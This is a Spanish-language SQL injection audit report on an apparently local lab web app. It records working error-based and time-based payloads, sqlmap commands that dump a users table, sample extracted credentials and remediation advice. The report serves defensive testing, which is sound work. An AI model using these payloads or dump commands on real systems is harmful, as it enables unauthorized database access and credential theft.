# Informe de auditoría SQLi

- Objetivo: `http://web.dev.local:8083`
- Tipo de análisis: detección y validación de SQL Injection
- Fecha de ejecución: `2026-04-24T05:45:15Z`
- Estado: **vulnerable**

## Resumen ejecutivo

La aplicación es vulnerable a **SQL injection en el parámetro GET `id`** cuando la petición incluye `Submit=Submit`. La explotación fue validada en vivo mediante:

- respuesta **error-based** con fuga de error SQL de MySQL/MariaDB;
- respuesta **time-based blind** con retraso reproducible de ~5 segundos;
- confirmación automática con `sqlmap`;
- extracción de datos de la base `sqli_demo`, tabla `users`.

## Superficie identificada

- Método: `GET`
- Ruta: `/`
- Parámetros relevantes:
  - `id`
  - `Submit`

Formulario observado:

```http
GET /?id=<valor>&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

## Evidencia técnica

### 1. Confirmación manual error-based

Payload usado:

```text
1' AND EXTRACTVALUE(8221,CONCAT(0x5c,0x7176627a71,(SELECT (ELT(8221=8221,1))),0x717a7a6a71))-- ijUc
```

Petición:

```http
GET /?id=1%27%20AND%20EXTRACTVALUE(... )--%20ijUc&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

Resultado observado:

- respuesta HTTP 200;
- error fatal visible con `mysqli_sql_exception`;
- mensaje `XPATH syntax error`, confirmando ejecución del payload en el motor SQL;
- referencia a `/var/www/html/low.php:11`.

Fragmento devuelto:

```text
Fatal error: Uncaught mysqli_sql_exception: XPATH syntax error: '\qvbzq1qzzjq' in /var/www/html/low.php:11
```

### 2. Confirmación manual time-based

Payload usado:

```text
1' AND (SELECT 5640 FROM (SELECT(SLEEP(5)))Dgaq)-- GvLI
```

Resultado observado:

- tiempo base: ~0.0 s
- tiempo con payload: ~5.0 s

Esto confirma una SQLi explotable incluso sin necesidad de ver resultados en pantalla.

### 3. Confirmación automática con sqlmap

Comando ejecutado:

```bash
sqlmap --batch --smart --level=3 --risk=2 \
  -u 'http://web.dev.local:8083/?id=1&Submit=Submit' \
  -p id --output-dir=/app/reports/sqlmap_output_live
```

Técnicas detectadas:

- boolean-based blind
- error-based
- time-based blind
- UNION query

DBMS identificado:

- MySQL / MariaDB

Stack observado:

- Apache `2.4.65`
- PHP `8.1.33`
- Linux Debian

## Explotación validada

Se validó acceso a datos con `sqlmap`:

```bash
sqlmap --batch \
  -u 'http://web.dev.local:8083/?id=1&Submit=Submit' \
  -p id --output-dir=/app/reports/sqlmap_output_live \
  --current-db --tables --dump -D sqli_demo -T users
```

Resultados:

- Base de datos actual: `sqli_demo`
- Tabla detectada: `users`
- Registros extraídos: `8`

Columnas observadas:

- `user_id`
- `email`
- `password`
- `username`
- `last_name`
- `first_name`

Ejemplos de datos recuperados:

```text
1 | admin@example.com   | password123 | admin     | Doe      | John
2 | jane@example.com    | secret456   | jsmith    | Smith    | Jane
3 | bob@example.com     | mypass789   | bjohnson  | Johnson  | Bob
```

CSV generado por la explotación:

```text
/app/reports/sqlmap_output_live/web.dev.local/dump/sqli_demo/users.csv
```

## Impacto

La vulnerabilidad permite, como mínimo:

- enumerar la base de datos;
- listar tablas y columnas;
- extraer información sensible de usuarios;
- abusar de distintas técnicas de inyección según el contexto.

El riesgo es **crítico**, ya que hay exposición directa de credenciales en texto claro.

## Causa probable

El parámetro `id` parece insertarse directamente en una consulta SQL sin parametrización adecuada. La traza sugiere uso de `mysqli_query(...)` en `/var/www/html/low.php`.

## Recomendaciones

1. Sustituir consultas construidas por concatenación por **prepared statements**.
2. Validar `id` estrictamente como entero antes de consultar.
3. Desactivar visualización de errores SQL en producción.
4. Rotar inmediatamente las credenciales expuestas.
5. Revisar el resto de parámetros y pantallas por patrones equivalentes.

## Conclusión

Se confirma una **SQL injection explotable** en `GET id` sobre `http://web.dev.local:8083`, condicionada a incluir `Submit=Submit`. La explotación permitió identificar el DBMS y extraer registros reales de la tabla `sqli_demo.users`.
